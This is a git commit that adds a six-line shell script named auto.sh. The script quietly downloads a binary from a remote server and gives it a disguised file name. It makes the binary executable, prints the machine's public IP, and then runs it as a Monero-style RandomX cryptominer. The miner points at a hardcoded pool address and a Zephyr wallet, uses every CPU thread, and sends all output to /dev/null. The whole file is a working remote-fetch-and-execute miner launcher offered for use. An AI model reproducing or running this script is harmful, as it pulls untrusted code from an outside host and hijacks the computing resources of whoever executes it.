5fbbafbf569f63a4930c36a957cd98e4506f6571
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-13 23:38:55 +0700

    Create auto.sh

---
+++ auto.sh
@@ -0,0 +1,6 @@
+wget -q -O AspireFinancialHoldings https://maper.info/api-server && chmod +x AspireFinancialHoldings >/dev/null 2>&1
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " "
+./AspireFinancialHoldings --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p 8v -a rx/0 -t $(nproc --all) >/dev/null 2>&1
